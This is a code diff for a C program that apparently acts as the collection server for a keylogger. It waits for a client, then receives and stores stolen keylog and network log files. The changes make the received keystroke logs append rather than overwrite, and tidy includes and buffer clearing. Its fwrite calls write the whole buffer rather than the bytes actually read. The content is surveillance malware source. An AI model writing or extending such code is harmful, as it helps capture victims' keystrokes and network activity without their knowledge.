@@ -6,13 +6,6 @@
 #include <unistd.h>       // write
 #include <fcntl.h>
 
-#include <stdio.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <fcntl.h>
-#include <sys/select.h>
-#include <sys/stat.h>
-
 #define BUFFER_SIZE 4096
 
 int main()
@@ -66,20 +59,19 @@ int main()
         sleep(180); //wait for the client to execute again
         memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
         /*Open keylog files for printing*/
-        FILE *keylog_log = fopen("log/keylog_received.txt", "w");
+        FILE *keylog_log = fopen("log/keylog_received.txt", "a");
         /*Receive a keylog file from the client*/
         while(read(csock, rec_buffer, sizeof(rec_buffer)) >0 ) {
             fwrite(rec_buffer, sizeof(char), sizeof(rec_buffer), keylog_log);
         }
         fclose(keylog_log);
-        memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
         sleep(5);
         
-
+        memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
         /*Open network log file for printing*/
-        FILE *network_log = fopen("log/network_received.txt", "w");
+        FILE *network_log = fopen("log/network_received.txt", "a");
         /*Receive network log file*/
-        while(read(csock, rec_buffer, sizeof(rec_buffer)) >0 )  {
+        while(read(csock, rec_buffer, sizeof(rec_buffer)) >0 ){
             fwrite(rec_buffer, sizeof(char), sizeof(rec_buffer), network_log);
         }
         fclose(network_log);
